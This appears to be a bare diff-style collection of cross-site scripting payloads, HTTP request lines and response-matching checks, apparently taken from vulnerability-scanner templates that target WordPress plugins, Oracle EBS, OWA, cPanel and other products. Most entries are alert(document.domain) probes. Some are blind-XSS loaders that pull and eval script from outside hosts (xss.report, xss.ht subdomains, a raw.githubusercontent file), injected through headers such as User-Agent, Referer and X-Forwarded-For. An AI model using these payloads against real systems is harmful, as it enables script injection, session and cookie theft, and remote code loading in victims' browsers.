+- '<script>alert(document.domain)</script>/services/?stylesheet=1">'
+- '<script>alert(document.location)</script>'
+- '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/s/shelled");a.send();</script>'
+- '<svg onload=alert(document.domain)>'
+- '<svg onx=() onload=(confirm)(123)>'
+- '<svg onx=() onload=(confirm)(88)>'
+- '<svg%20onx=()%20onload=(confirm)(123)>'
+- '<svg/onload=confirm(25)>'
+- '>--><script>alert(1)</script>&action=wooccm_nuke_options&'
+- '><script>alert(/XSS/)</script>'
+- '?a"><script>alert(1)</script>&new-user-approve-settings'
+- 'Got: <script>alert(document.domain)</script><br>'
+- 'LGD_OID = <script>alert(document.domain)</script>'
+- 'Result : <script>alert(document.domain)</script>'
+- 'Unrecognized field "<img onerror=confirm(1337) src/>"'
+- '\"};alert(1337);//'
+- '\u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your'
+- '^<script>alert\(document.domain\)</script>$'
+- 'agenda_js.php?type=xss" onmouseover=alert(document.domain)'
+- 'alert(document.domain)//&et=ServerError'
+- 'ath_upload_calameo_publication(id\"><script>alert(document.domain)</script>&)'
+- 'confirm(document.domain)'
+- 'contains(body, "/><script>alert(document.domain)</script>") && contains(body, "EPweb")'
+- 'contains(body, "</script><script>alert(document.location)</script>") && contains(body, "showImageDetail")'
+- 'contains(body, "<ScRipT>alert(document.domain);</ScRipT>")'
+- 'contains(body, "<img onerror =alert(document.domain) src=1> METASCAN")'
+- 'contains(body, "<img src=a onerror=alert(document.domain)>") && contains(body, "TEP STOP")'
+- 'contains(body, "<img src=x onerror=prompt(document.domain)>")'
+- 'contains(body, "<script>alert(document.domain)</script>") && contains(body, "Phuket Solution")'
+- 'contains(body, "<svg/onload=alert(document.domain)>") && contains(body, "beyondtrust")'
+- 'contains(body, "<svg/onload=alert(document.domain)>")'
+- 'contains(body, "><script>alert(document.domain)</script>") && contains(body, "New Topic")'
+- 'contains(body, "Talroo Jobs") && contains(body, "confirm(document.domain)")'
+- 'contains(body, "\"><img src=x onerror=alert(document.domain)> </title>")'
+- 'contains(body, "alert(\"METASCAN\");if(1){")'
+- 'contains(body, "alert(document.domain)") && contains(body, "Joomla") && contains(tolower(body), "joombri")'
+- 'contains(body, "class=\"cons_form") && contains(body, "><img src=x onerror=prompt(document.domain)>")'
+- 'contains(body, "rentequip") && contains(body, "1026553;alert(document.domain)//772")'
+- 'contains(body, "value=\"SSLVPN\"><script>alert(document.domain)</script>")'
+- 'contains(body_1, "><img src=x onerror=prompt(document.domain)")'
+- 'contains(body_2, "<script>alert(document.domain)</script>")'
+- 'contains(body_2, "<svg/onload=alert(document.domain)>") && contains(body_2, "watu")'
+- 'contains(body_2, "javascript:alert(document.domain)")'
+- 'contains(body_2, "参数 1\"+alert(document.domain)+")'
+- 'contains(body_4, "<script>alert(document.domain)</script>")'
+- 'contains_all(body, "<img src=a onerror=alert(document.domain)>", "\"payload\":")'
+- 'contains_all(body, "<script>alert(document.domain)</script>", "travelpayout_flight")'
+- 'contains_all(body, "<script>alert(document.domain)</script>={\"AeDebug")'
+- 'contains_all(body, "><img/src/onerror=.1|alert`{{num1}}` class={{num1}}>", "user_login_id")'
+- 'contains_all(body, "News Script PHP Pro", "<script>alert(document.domain)</script>")'
+- 'contains_all(body, "onfocus=alert(document.domain) autofocus=", "catalog-results", "joomla")'
+- 'contains_all(body, "quizzes/flashcard", "</script><script>alert(document.domain)</script>")'
+- 'contains_all(body_2, "<script>alert(document_domain)</script>", "LDAP-authentication-intergrating-with-AD")'
+- 'header\"><script>alert(document.domain)</script>.css?'
+- 'host + "/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(domain)%0c"'
+- 'id="action" value=""><svg/onload=alert(window.origin)>"/>'
+- 'import-wbcr_insert_php&a\"><script>alert(1)</script>"'
+- 'item: <script>alert(document.domain)</script>'
+- 'javascript:alert(1)'
+- 'javascript:eval("var a=document.createElement(\"script\");a.src=\"//xss.report/s/shelled\";document.body.appendChild(a)")'
+- 'manage&a\"><script>alert(1)</script>">'
+- 'onfocus="confirm(document.domain)"autofocus'
+- 'onfocusin= alert('
+- 'onmouseover="alert(document.domain)"style='
+- 'onmouseover=alert(/d0cument.domain/) y=&act'
+- 'something"><script>alert(document.domain)'
+- 'sub menu for: <script>alert(document.domain)</script>'
+- 'test" onmouseover="alert(document.domain);" style'
+- 'text/javascript">alert(/XSS/)</script>'
+- 'value=""onfocus="alert(document.cookie)"autofocus=""'
+- 'value="2134"><script>alert(document.domain)</script>" min="0"'
+- 'value="><script>alert(document.domain)</script>" >'
+- 'value="FB_appId"><script>alert(document.domain)</script>"'
+- 'value="\"><script>alert(document.domain)</script>'
+- 'value="test"><script>alert(document.domain)</script>">'
+- 'wc-reports&a\"><script>alert(1)</script>">All'
+- '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
+- '{{BaseURL}}/?rsd=%27%3E%3Csvg%2Fonload%3Dconfirm(%2F{{randstr}}%2F)%3E'
+- '{{BaseURL}}/?{alert(1)}'
+- '{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
+- '{{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>'
+- '{{BaseURL}}/admincp.php?infloat=yes&handlekey=123);alert(/testvul/);//'
+- '{{BaseURL}}/ajax.php?infloat=yes&handlekey=123);alert(/xss/);//'
+- '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert("METASCAN");if(1){//'
+- '{{BaseURL}}/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror%E2%80%A9=alert(document.domain)%20src=1>%20METASCAN'
+- '{{BaseURL}}/bollywood.php?s="><script>alert(document.domain)</script>'
+- '{{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>'
+- '{{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert(1)>'
+- '{{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
+- '{{BaseURL}}/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+- '{{BaseURL}}/dam/jcr:content/xxxxxxxxxxxx%27\%22%3E%3Csvg/onload=alert(1)%3E.childrenlist.json.json/ab.html'
+- '{{BaseURL}}/editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path='
+- '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\"><svg/onload=alert(1337)>'
+- '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
+- '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E'
+- '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
+- '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.cookie)</script>'
+- '{{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E'
+- '{{BaseURL}}/index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b'
+- '{{BaseURL}}/index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";'
+- '{{BaseURL}}/jcms/m_5_b/selmulti_column.jsp?type=1&userId=2222222%2b><script>alert(/test/)</script>'
+- '{{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>'
+- '{{BaseURL}}/login/?service=tenant:;;9503%22();}]</script><img%20src=x%20onerror=alert(document.cookie)>{{7*7}}9310&redirectTo=%2Ftenant%2F%3B%253B9503%2522%2528%2529%253B%257D%255D9310'
+- '{{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+- '{{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
+- '{{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
+- '{{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"'
+- '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'
+- '{{BaseURL}}/products-listing.php?s="><script>alert(document.domain)</script>'
+- '{{BaseURL}}/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>'
+- '{{BaseURL}}/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/'
+- '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+- '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+- '{{BaseURL}}/steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/'
+- '{{BaseURL}}/uc_server/admin.php?m=user&a=login&iframe=&sid=%27%22%3E%3Cscript%3Ealert(/asdfa/)%3C/script%3E'
+- '{{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
+- '{{BaseURL}}/wp-admin/admin-ajax.php?action=zip_search&nonce=5ccfc183d6a&zip=10001&callback=jQuery370034739925402950467_1693440634785"%3E%3Cimg src=x onerror=alert(1)>'
+- '{{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3Cscript%3Ealert(123);%3C/script%3E'
+- '{{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x'
+- '{{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1'
+- '{{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>'
+- '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
+- '{{BaseURL}}:2082/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+- '{{BaseURL}}:2083/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+- '{{BaseURL}}:2086/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
+- <img src=x onerror=alert(1)>
+- <script>alert(document.domain)</script>
+- <svg/onload=alert(document.domain)>
+- contains(body,"<script>alert(/test/)</script>")
+- contains(body,"<script>alert(\'c4ca4238a0b923820dcc509a6f75849b\')</script>")
+- contains(body,"<script>alert(\'xss\')</script>")
+- contains(body,"<script>prompt(/XSS/)</script>")
+- contains(body,"<svg/onload=alert(1)>")
+- contains(body,"alert(/testvul/)")
+- contains(body,'<script>alert(/asdfa/)</script>')
+- contains(body,'\"><ScRiPt>alert(/xss test/)</ScRiPt>')
+- contains(body,'alert(/xss/);//')
+- contains(body,'alert(e10adc3949ba59abbe56e057f20f883e)')
+- contains(body,'autofocus onfocus=alert(1) style=')
+- contains(body_2, '><img src=x onerror=console.log(123);>')
+- contains(body_2, 'Result against \"<script>alert(document.domain)</script>\" keyword')
+- contains(body_3,'\"><img src=\"x\" onerror=\"alert(document.domain);\">\" placeholder')
+- jquery/1.7.2/jquery.min.js"></script>
+- pattern: "</script><script>alert(document.domain)</script>"
+- raw: '{"comment": "<img src=x onerror=alert(\'XSS\')>"}'
+- status_code==200 && contains(body,"<script>alert(/hi/)</script>")
+- wp-admin/admin.php?page=nf-import-export&"><script>alert(/document.domain/)</script>
+- wp-admin/admin.php?page=nf-settings&"><script>alert(/document.domain/)</script>
+- wp-admin/edit.php?post_status=all&post_type=nf_sub&form_id=1&"><script>alert(/document.domain/)</script>
+2 ) Write Leave a Reply  place your payload :     <sVg/onLy=1 onLoaD=confirm(1)//
+2022-06-22<script>alert(document.domain)</script>
+2022-12-22<script>alert(document.domain)</script>
+</script>
+</script><script>alert(document.domain)</script>
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(document.domain)</script>"></form>
+<script type="text/javascript">
+<script>alert(document.domain)</script>
+Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://XXXXX.xss.ht></script>"
+Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://iambatman.xss.ht></script>"
+Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://nti.xss.ht></script>"
+Cookie: language='-alert(1)-';
+Forwarded: 'something"><script>alert(document.domain)</script>.domain.com'
+GET /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e HTTP/1.1
+GET /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e HTTP/1.1
+GET /%2F?"><script>alert(1)</script> HTTP/1.1
+GET /%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+GET /(A("><script>alert(1)</script>))/ HTTP/1.1
+GET //?"><script>alert(1)</script> HTTP/1.1
+GET /7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E HTTP/1.1
+GET /?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert("test"}} HTTP/1.1
+GET /?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E HTTP/1.1
+GET /?{alert(1)} HTTP/1.1
+GET /CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1) HTTP/1.1
+GET /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E HTTP/1.1
+GET /OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E HTTP/1.1
+GET /OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E HTTP/1.1
+GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>alert(document.domain)</script> HTTP/1.1
+GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
+GET /bbs/index.php/%27%2Balert(e10adc3949ba59abbe56e057f20f883e)%2B%27/?case=file HTTP/1.1
+GET /ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")> HTTP/1.1
+GET /cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1) HTTP/1.1
+GET /config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
+GET /e/ViewImg/index.html?url=javascript:alert(document.domain) HTTP/1.1
+GET /email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E HTTP/1.1
+GET /filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html HTTP/1.1
+GET /financial_times.php?issue=%3Cscript%3Ealert(%27xss%27)%3C/script%3E HTTP/1.1
+GET /go/index.php?u=</script><script>alert('c4ca4238a0b923820dcc509a6f75849b')</script><script> HTTP/1.1
+GET /guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E HTTP/1.1
+GET /help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
+GET /index.php?mode=search&wd=</title><svg/onload=alert(1)> HTTP/1.1
+GET /jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%281%29%20style=%22%22 HTTP/1.1
+GET /login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E HTTP/1.1
+GET /login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+GET /lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm HTTP/1.1
+GET /lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm HTTP/1.1
+GET /main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E HTTP/1.1
+GET /main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E HTTP/1.1
+GET /main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+" HTTP/1.1
+GET /mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}') HTTP/1.1
+GET /nagioslogserver/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host HTTP/1.1
+GET /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)// HTTP/1.1
+GET /plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d HTTP/1.1
+GET /product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}> HTTP/1.1
+GET /properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+GET /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa HTTP/1.1
+GET /status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E HTTP/1.1
+GET /tag.php?tag={{tag}}&mode=1>%22><ScRiPt>alert(/xss%20test/)</ScRiPt> HTTP/1.1
+GET /tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E HTTP/1.1
+GET /tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)<%2fscript> HTTP/2
+GET /tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E HTTP/1.1
+GET /topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E HTTP/1.1
+GET /wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
+GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
+GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
+GET /wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
+GET /wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
+GET /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
+GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+GET /wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1 HTTP/1.1
+GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
+GET /wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E HTTP/1.1
+GET /wp-content/plugins/wp-vr-view/asset/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
+GET /wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg HTTP/1.1
+GET wp-admin/admin.php?page=watu_question&question=1&action=edit&quiz=1"><svg/onload=alert(document.domain)>  HTTP/1.1
+Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://XXXXX.xss.ht></script>"
+Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://iambatman.xss.ht></script>"
+Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://nti.xss.ht></script>"
+Origin: "ORCanary12345.comOR'&#8211;><script src=https://XXXXX.xss.ht></script>"
+Origin: "ORCanary12345.comOR'&#8211;><script src=https://iambatman.xss.ht></script>"
+Origin: "ORCanary12345.comOR'&#8211;><script src=https://nti.xss.ht></script>"
+Origin: '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
+POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload HTTP/1.1
+Referer: "RFcanary12345.comRF'&#8211;><script src=https://XXXXX.xss.ht></script>"
+Referer: "RFcanary12345.comRF'&#8211;><script src=https://iambatman.xss.ht></script>"
+Referer: "RFcanary12345.comRF'&#8211;><script src=https://nti.xss.ht></script>"
+Referer: '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
+Reflected: 'something"><script>alert(document.domain)</script>.domain.com'
+SAMLResponse="><svg/onload=alert('randomxss')>
+StatusCode() == 200 && StringSearch("body", '<script>alert(1)</script>')
+StatusCode() == 200 && StringSearch("resHeaders", "text/html") && StringSearch("body", "<svg/onload=alert(2)>")
+StatusCode() == 200 && StringSearch("response", "document.ltiAuthForm") && StringSearch("response", "javascript:alert('xss')")
+StatusCode() == 200 && StringSearch("response", "nginx vhost traffic") && StringSearch("response", "-prompt(1)-")
+StatusCode() == 200 && StringSearch("response", 'var valueUser = "j";-alert(1)-"x";') && StringSearch("resHeaders", "text/html")
+StatusCode() == 500 && StringSearch("response", "Kafdrop") && StringSearch("response", "<img src=x onerror=alert(2)>")
+The value of the `language request` parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload 75943";alert(1)//569 was submitted in the language parameter. This input was echoed unmodified in the application's response. The attacker can modify the token session and he can discover sensitive information for the server.
+The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload ycsz3"><script>alert(1)</script>bn76w was submitted in the redirect parameter. This input was echoed unmodified in the application's response. By using this Java Script injection, the attacker can trick a lot of users into visiting his dangerous URL which is reflected on the login form, before they log in, warning them that there is a problem with the login
+User-Agent: "Mozilla UACanary12345'&#8211;><script src=https://iambatman.xss.ht></script>"
+User-Agent: "Mozilla UACanary12345'&#8211;><script src=https://nti.xss.ht></script>"
+User-Agent: "Mozilla UACanary12345\'&#8211;><script src=https://XXXXX.xss.ht></script>"
+User-Agent: '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
+User-Agent: <script>alert(/hi/)</script>
+X-Client-IP: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Forwarded-For: '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
+X-Forwarded-For: 'something"><script>alert(document.domain)</script>.domain.com'
+X-Forwarded-For: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Forwarded-Host: 'something"><script>alert(document.domain)</script>.domain.com'
+X-Forwarded-Host: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Forwarded-Host:'-alert(1)-'
+X-Forwarded-Prefix: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Forwarded-Server: 'something"><script>alert(document.domain)</script>.domain.com'
+X-Original-URL: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Originating-IP: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Remote-Addr: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Remote-IP: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-Rewrite-URL: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-forwarded-origin: 127.0.0.1/"></script><script>alert(document.domain);</script>
+X-forwarded-server: 127.0.0.1/"></script><script>alert(document.domain);</script>
+act=send&content=1&page_id=2%22><script>prompt(/XSS/)</script>&rid=
+add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1
+alert(document.domain);
+authorizationUrl: javascript:alert(document.domain)//
+body: <script>alert(1);+"=</script>
+comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
+companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=
+content_title=1"><sVg/Onload=alert`document.domain`></p>
+csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ennois&login={{randstr}}&CipheredValue=
+description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+description: This template checks for an XSS vulnerability in the hidden input field where the 'oncontentvisibilityautostatechange' attribute is used full payload "\"></div><input type=\"hidden\" oncontentvisibilityautostatechange=\"confirm('MrAli')\" style=\"content-visibility:auto>".
+description: onload="alert(1)" <img src=https://metascan.ru/_astro/metascan-logo.dfd76162.svg onclick="alert(2)" onerror="alert(3)">
+expression: response.body.bcontains(b'</script><script>alert("a1f1r1o1g1t1e1s1t1")</script>')
+expression: response.body.bcontains(bytes("<script>alert(" + r1 + ");</script>")) && response.body.bcontains(b"citrix")
+expression: response.status == 200 && response.body.bcontains(b'alert(`Hello-hole')
+id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0
+ieuiMeetingErrorDisplay.jsp?ErrCode='"><svg/onload=alert(2)>
+jtfLOVInProcess.jsp?AAA=AAAAAAAAAA'"><svg/onload=alert(2)>
+oksAutoRenewalHelp.jsp?thanks='"><svg/onload=alert(2)>
+option_key=email_from&option_group=email&option_value=%22%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert(document.domain)%3B%22%3E&module=settings%2Fgroup%2Femail
+origin: '-alert(1)-'
